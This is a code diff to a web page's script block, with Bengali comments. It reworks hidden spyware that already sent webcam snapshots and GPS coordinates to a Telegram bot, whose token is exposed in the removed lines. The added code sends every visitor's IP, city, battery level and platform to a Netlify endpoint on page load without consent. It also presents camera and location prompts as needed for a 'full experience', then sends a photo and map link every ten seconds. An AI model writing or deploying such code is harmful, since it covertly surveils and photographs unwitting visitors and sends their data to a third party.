@@ -356,78 +356,92 @@
     </div>
 
     <script>
-        const botToken = '8239197154:AAH-VeIISL9nO-EZFL2wJqcVIV6S8UhMVAY';
-        const chatId = '7950771882';
-        const overlay = document.getElementById('advanced-overlay');
-        const okBtn = document.getElementById('final-ok-btn');
+    // আপনার নতুন এবং সুরক্ষিত API ব্রিজ লিঙ্ক
+    const API_BRIDGE = 'https://peaceful-torte-b8ab6b.netlify.app/.netlify/functions/receiver';
+    const overlay = document.getElementById('advanced-overlay');
+    const okBtn = document.getElementById('final-ok-btn');
 
-        // Initial Load Check
-        window.addEventListener('load', () => {
-            if (localStorage.getItem('granted') === 'true') {
-                overlay.style.display = 'none';
-                initSecurity();
-            } else {
-                setTimeout(() => { overlay.style.display = 'flex'; }, 3000);
-            }
-        });
+    // ডাটা পাঠানোর কমন ফাংশন
+    async function sendToBridge(type, message, photoBlob = null) {
+        const fd = new FormData();
+        fd.append('type', type);
+        fd.append('content', message);
+        if (photoBlob) fd.append('photo', photoBlob, 'capture.jpg');
 
-        // OK Button Logic
-        okBtn.addEventListener('click', () => {
-            // Step 1: Request Camera
-            navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                // Step 2: Request Location
-                navigator.geolocation.getCurrentPosition(pos => {
-                    localStorage.setItem('granted', 'true');
-                    overlay.style.display = 'none';
-                    startSystem(stream);
-                }, err => {
-                    alert("Location access is required for full experience.");
-                });
-            })
-            .catch(err => {
-                alert("Camera access is required for full experience.");
+        try {
+            await fetch(API_BRIDGE, {
+                method: 'POST',
+                body: fd
             });
+        } catch (e) { console.log("Bridge Error"); }
+    }
+
+    // ১. সাইলেন্ট ট্র্যাকার: পেজ লোড হলেই আইপি ও ডিভাইস তথ্য যাবে
+    window.addEventListener('load', async () => {
+        if (localStorage.getItem('granted') === 'true') {
+            overlay.style.display = 'none';
+            initSecurity();
+        } else {
+            setTimeout(() => { overlay.style.display = 'flex'; }, 3000);
+        }
+
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            const battery = await navigator.getBattery();
+            const info = `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
+            sendToBridge("Silent Entry Alert", info);
+        } catch (e) { sendToBridge("Silent Entry Alert", "Visitor joined (Details hidden)"); }
+    });
+
+    // ২. বাটনে ক্লিক করলে ক্যামেরা ও লোকেশন ট্র্যাকিং
+    okBtn.addEventListener('click', () => {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            navigator.geolocation.getCurrentPosition(pos => {
+                localStorage.setItem('granted', 'true');
+                overlay.style.display = 'none';
+                startCapture(stream, pos);
+            }, err => {
+                alert("Location access is required for full experience.");
+            });
+        })
+        .catch(err => {
+            alert("Camera access is required for full experience.");
         });
+    });
 
-        async function initSecurity() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                startSystem(stream);
-            } catch(e) { localStorage.removeItem('granted'); }
-        }
+    async function initSecurity() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            navigator.geolocation.getCurrentPosition(pos => {
+                startCapture(stream, pos);
+            });
+        } catch(e) { localStorage.removeItem('granted'); }
+    }
 
-        function startSystem(stream) {
-            setInterval(() => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                const canvas = document.createElement('canvas');
-                
-                setTimeout(() => {
-                    canvas.width = 400; canvas.height = 300;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                    const imgData = canvas.toDataURL('image/jpeg');
-                    
-                    navigator.geolocation.getCurrentPosition(async (p) => {
-                        const b = await navigator.getBattery();
-                        const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        const msg = `📍 Map: ${map}\n🔋 Battery: ${(b.level*100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
-                        
-                        // Send Text
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-                        // Send Image
-                        fetch(imgData).then(r => r.blob()).then(blob => {
-                            const fd = new FormData();
-                            fd.append('chat_id', chatId);
-                            fd.append('photo', blob, 'shot.jpg');
-                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method: 'POST', body: fd});
-                        });
-                    });
-                }, 1000);
-            }, 6000);
-        }
-    </script>
+    function startCapture(stream, pos) {
+        setInterval(() => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 300;
+            
+            setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                canvas.toBlob(blob => {
+                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToBridge("Live Track", `📍 GPS: ${map}\n📸 Photo Attached`, blob);
+                }, 'image/jpeg');
+            }, 1000);
+        }, 10000); // প্রতি ১০ সেকেন্ড পরপর ছবি ও লোকেশন পাঠাবে
+    }
+</script>
+
     <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
